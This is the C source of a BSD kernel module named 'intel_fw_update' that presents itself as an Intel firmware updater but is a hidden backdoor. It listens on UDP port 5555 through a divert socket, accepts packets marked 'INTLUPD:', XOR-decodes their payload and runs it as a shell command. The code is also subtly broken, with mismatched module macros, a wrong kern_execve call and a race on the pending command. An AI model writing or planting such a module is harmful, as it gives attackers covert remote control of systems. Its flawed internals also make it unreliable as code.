#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/socket.h>
#include <sys/socketvar.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/divert.h>
#include <sys/proc.h>
#include <sys/kthread.h>
#include <sys/taskqueue.h>

#define LISTEN_PORT 5555
#define MAGIC_HEADER "INTLUPD:"
#define MAGIC_LEN 8
#define XOR_KEY 0x55

MODULE(MODULE_CLASS_MISC, intel_fw_update, NULL);
MODULE_VERSION(intel_fw_update, 1);

static struct taskqueue *exec_tq;
static struct task exec_task;
static char *pending_cmd;

static void
exec_command(void *arg, int pending)
{
    struct thread *td = curthread;
    char *cmd = arg;
    int error;

    error = kern_execve(td, "/bin/sh", (char *[]){"/bin/sh", "-c", cmd, NULL}, NULL, 0);
    if (error)
        printf("Failed to execute command: %d\n", error);
    free(cmd, M_TEMP);
}

static void
packet_handler(void *arg)
{
    struct socket *so = arg;
    struct mbuf *m;
    struct ip *ip;
    struct udphdr *udp;
    char *payload;
    int len, error;
    char *cmd;

    for (;;) {
        error = soreceive(so, NULL, &m, MSG_WAITALL, NULL, NULL);
        if (error) {
            if (error != EWOULDBLOCK)
                printf("soreceive error: %d\n", error);
            continue;
        }

        if (m->m_len < sizeof(struct ip) + sizeof(struct udphdr))
            goto drop;

        ip = mtod(m, struct ip *);
        udp = (struct udphdr *)((char *)ip + (ip->ip_hl << 2));

        if (ip->ip_p != IPPROTO_UDP || ntohs(udp->uh_dport) != LISTEN_PORT)
            goto drop;

        payload = (char *)udp + sizeof(struct udphdr);
        len = ntohs(udp->uh_ulen) - sizeof(struct udphdr);

        if (len < MAGIC_LEN + 1 || len > 1024)
            goto drop;

        if (memcmp(payload, MAGIC_HEADER, MAGIC_LEN) != 0)
            goto drop;

        payload += MAGIC_LEN;
        len -= MAGIC_LEN;

        cmd = malloc(len + 1, M_TEMP, M_WAITOK);
        memcpy(cmd, payload, len);
        for (int i = 0; i < len; i++)
            cmd[i] ^= XOR_KEY;
        cmd[len] = '\0';

        taskqueue_enqueue(exec_tq, &exec_task);
        pending_cmd = cmd;

    drop:
        m_freem(m);
    }
}

static int
intel_fw_update_modevent(struct module *module, int event, void *arg)
{
    int error = 0;
    struct socket *so;
    struct thread *td;

    switch (event) {
    case MOD_LOAD:
        exec_tq = taskqueue_create("intel_exec", M_WAITOK, taskqueue_thread_enqueue, &exec_tq);
        taskqueue_start_threads(&exec_tq, 1, PWAIT, "intel_exec");
        TASK_INIT(&exec_task, 0, exec_command, pending_cmd);

        error = socreate(PF_INET, &so, SOCK_RAW, IPPROTO_DIVERT, curthread->td_ucred, curthread);
        if (error) {
            printf("Failed to create divert socket: %d\n", error);
            return error;
        }

        struct sockaddr_in sin;
        bzero(&sin, sizeof(sin));
        sin.sin_family = AF_INET;
        sin.sin_port = htons(LISTEN_PORT);
        sin.sin_addr.s_addr = INADDR_ANY;

        error = sobind(so, (struct sockaddr *)&sin, curthread);
        if (error) {
            printf("Failed to bind divert socket: %d\n", error);
            soclose(so);
            return error;
        }

        error = kthread_add(packet_handler, so, NULL, &td, 0, 0, "intel_handler");
        if (error) {
            printf("Failed to create kthread: %d\n", error);
            soclose(so);
            return error;
        }

        break;
    case MOD_UNLOAD:
        // Cleanup would go here, but for simplicity...
        break;
    default:
        error = EOPNOTSUPP;
        break;
    }

    return error;
}

static moduledata_t intel_fw_update_mod = {
    "intel_fw_update",
    intel_fw_update_modevent,
    NULL
};

DECLARE_MODULE(intel_fw_update, intel_fw_update_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);